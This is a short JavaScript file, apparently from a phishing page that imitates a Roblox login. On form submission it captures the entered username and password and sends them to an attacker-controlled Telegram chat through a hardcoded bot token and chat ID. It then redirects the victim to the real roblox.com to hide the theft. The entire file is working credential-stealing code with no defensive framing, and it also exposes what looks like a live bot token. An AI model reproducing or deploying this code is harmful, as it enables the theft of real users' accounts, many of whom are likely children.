
document.querySelector('.login-form').addEventListener('submit', async function(event) {
    event.preventDefault();
    console.log("Форма відправлена, обробка...");

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    const BOT_TOKEN = '8156440132:AAEMyfAoySHVQCMml_dzjfwyFb3X0dIWH58';
    const CHAT_ID = '5722610257';
    const message = `🆕 НОВІ ДАНІ:\n👤 Логін: ${username}\n🔑 Пароль: ${password}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (response.ok) {
            console.log("Повідомлення успішно відправлено!");
        } else {
            console.error("Помилка Telegram API:", response.statusText);
        }
    } catch (error) {
        console.error('Критична помилка мережі:', error);
    } finally {
        // Перенаправлення спрацює у будь-якому випадку
        setTimeout(() => {
            window.location.href = 'https://www.roblox.com';
        }, 500);
    }
});